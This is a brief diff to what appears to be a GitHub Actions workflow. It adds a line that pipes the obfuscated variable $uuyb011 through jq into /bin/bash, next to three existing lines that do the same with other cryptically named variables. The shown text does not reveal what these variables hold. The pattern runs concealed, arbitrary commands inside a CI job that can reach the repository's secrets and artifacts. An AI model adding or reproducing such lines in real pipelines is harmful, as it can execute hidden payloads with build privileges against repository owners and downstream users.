@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$d0108" | jq -r .bkwm3239 | /bin/bash
           echo $b6834 | jq -r .v246 | /bin/bash
           printf '%s' "$vz0" | jq -r .cb0 | /bin/bash
+          echo $uuyb011 | jq -r .gem21 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
